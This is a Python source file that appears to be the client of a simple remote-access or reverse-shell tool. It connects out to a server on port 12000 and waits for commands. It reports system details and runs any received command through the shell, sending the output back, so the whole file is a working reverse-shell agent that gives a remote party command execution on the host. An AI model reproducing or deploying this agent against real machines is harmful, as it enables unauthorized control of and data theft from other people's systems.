from enum import Enum
import socket
import struct
import subprocess
import platform
import socket
from typing import List
from unittest import result
from myparser import Parser
import re


from command_executioner import CommandExecutioner

server_port = 12000

def split_arg_string(string):
    """Given an argument string this attempts to split it into small parts."""
    rv = []
    for match in re.finditer(r"('([^'\\]*(?:\\.[^'\\]*)*)'"
                             r'|"([^"\\]*(?:\\.[^"\\]*)*)"'
                             r'|\S+)\s*', string, re.S):
        arg = match.group().strip()
        if arg[:1] == arg[-1:] and arg[:1] in '"\'':
            arg = arg[1:-1].encode('ascii', 'backslashreplace') \
                .decode('unicode-escape')
        try:
            arg = type(string)(arg)
        except UnicodeError:
            pass
        rv.append(arg)
    return rv

def get_platform_info():
    platform_name = platform.platform()
    platform_version = platform.version()
    platform_machine = platform.machine()
    platform_node = platform.node()
    platform_processor = platform.processor()
    return [platform_name, platform_version, platform_machine, platform_node, platform_processor]

parser_cmd = Parser()

def shell_command(args:dict ={}):
    try:
        cmd = str(args["-c"])
        fork_option = False
        if "-f" in args.keys():
            fork_option = True
        #print("cmd parsed = "+cmd)
        cmd_list = split_arg_string(cmd)
        print("CMD LIST PARSED = "+str(cmd_list))
        """l = parser_cmd.parse(cmd)
        #print("list parsed="+str(l))
        cmd_list = []
        cmd_list.append(l.pop(0))
        dict_parameters = l.pop(0)
        #print("par dict="+str(dict_parameters))
        for k in dict_parameters.keys():
            cmd_list.append(k)
            if type(dict_parameters[k]) == bool:
                continue
            cmd_list.append(dict_parameters[k])"""
        
        
        if fork_option == True:
            print("Forked: "+str(cmd_list))
            text_stout = "process forked... stdout ignored"
            text_sterr = "process forked... stderr ignored"
            subprocess.run(cmd_list, capture_output=False, shell=True)
        else:
            print("Executing: "+str(cmd_list))
            result = subprocess.Popen(cmd_list,stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
            text_stout = ""
            while True:
                line = result.stdout.readline()
                if not line:
                    break
                text_stout += str(line.rstrip())[2:-1]+"\n"
            
            text_sterr = ""
            while True:
                line = result.stderr.readline()
                if not line:
                    break
                text_sterr += str(line.rstrip())[2:-1]+"\n"
            
            print("Result: "+str(text_stout))
        return [0,"Output of cmd:"+str(cmd_list)+": \nstdout:\n"+text_stout+"\nstderr:\n"+text_sterr]
    except Exception as e:
        return [0,"Shell command function exception: "+str(e)]

def sysinfo_command(args:dict ={}):
    return [0,str(get_platform_info())]

def end_conn_command(args:dict ={}):
    return [-1,"Ending this connection"]

cmd_to_function = {
    "sysinfo":sysinfo_command,
    "closecli":end_conn_command,
    "shellexec":shell_command
}
cmd_executioner = CommandExecutioner(cmd_to_function)

def main():
    platform_info = str(get_platform_info())
    ip_address = input("Insert IP Address > ")
    if ip_address == "":
        ip_address = "127.0.0.1"
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:

        client_socket.connect((ip_address, server_port))

        data = client_socket.recv(1024)
        identity_response = data.decode()
        print(identity_response)
        print("Listening for commands from server...")
        while True:
            try:
                data = client_socket.recv(1024)
                if data:
                    full_command = data.decode()
                    try:
                        parsed_cmd = parser_cmd.parse(full_command)
                        cmd_name = parsed_cmd.pop(0)
                        param_dict = parsed_cmd.pop(0)
                        exit_status, msg = cmd_executioner.execute(cmd_name,param_dict)
                        msg = msg.encode()
                        msg = struct.pack('>I', len(msg)) + msg
                        client_socket.sendall(msg)
                        if exit_status !=0:
                            break
                    except Exception as e:
                        print("Invalid command: "+full_command+" " +str(e))
                        client_socket.send("Invalid command".encode())
                        
            except:
                print("Exception!")
                break


if __name__ == '__main__':
    main()
